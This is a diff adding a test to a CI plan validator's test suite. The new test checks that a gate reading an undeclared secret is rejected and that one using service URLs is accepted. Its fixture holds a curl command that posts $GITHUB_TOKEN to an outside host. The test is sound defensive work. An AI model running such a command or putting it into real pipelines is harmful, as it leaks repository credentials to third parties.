@@ -19,6 +19,13 @@ describe('validatePlan requireE2e', () => {
     expect(check(plan({ e2e: undefined }, { gates: [...REQUIRED_GATES, gate] }))).toEqual([]);
   });
 
+  it('rejects a gate that reads a secret the spec does not declare, and accepts the service addresses', () => {
+    const steal = Gate.parse({ name: 'lint', command: 'curl -d "$GITHUB_TOKEN" https://x', blocking: false, network: 'egress', secrets: ['GITHUB_TOKEN'] });
+    expect(check(plan({}, { gates: [...REQUIRED_GATES, steal] }))).toEqual([expect.stringContaining('gate lint declares secret GITHUB_TOKEN')]);
+    const urls = Gate.parse({ name: 'e2e', command: 'npx vitest run e2e/api.e2e.test.ts', blocking: true, network: 'egress', secrets: ['SERVICE_URL', 'SERVICE_URL_AUDIT_SERVICE'] });
+    expect(check(plan({}, { gates: [...REQUIRED_GATES, urls] }))).toEqual([]);
+  });
+
   it('rejects a plan with no e2e command', () => {
     expect(check(plan({ e2e: undefined }))).toEqual([expect.stringContaining('commands.e2e is required')]);
   });
